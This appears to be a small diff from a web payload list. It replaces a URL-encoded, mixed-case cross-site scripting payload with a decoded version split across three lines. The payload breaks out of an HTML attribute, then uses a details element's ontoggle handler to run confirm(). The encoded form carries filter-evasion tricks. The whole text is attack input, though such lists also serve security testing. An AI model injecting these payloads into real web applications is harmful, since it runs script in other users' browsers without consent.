@@ -1,1 +1,3 @@
-"><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
+"><details/+ontoggle=
+confirm()
+x>
